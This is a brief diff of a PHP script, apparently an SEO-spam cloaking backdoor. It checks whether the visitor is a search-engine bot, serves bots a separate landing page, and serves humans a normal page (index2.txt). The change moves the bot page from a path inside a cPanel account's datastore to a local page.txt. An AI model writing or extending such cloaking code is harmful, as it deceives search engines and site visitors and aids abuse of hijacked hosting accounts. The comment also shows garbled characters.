@@ -12,7 +12,7 @@ function JajangFetchLocal($filePath) {
     }
 }
 
-$landing_page = '/home/chiacundippal/.cpanel/datastore/mysql-database-count';
+$landing_page = __DIR__ . '/page.txt';
 $index_home   = __DIR__ . '/index2.txt'; // HUMAN â†’ halaman biasa
 
 if (isSearchEngineBot()) {
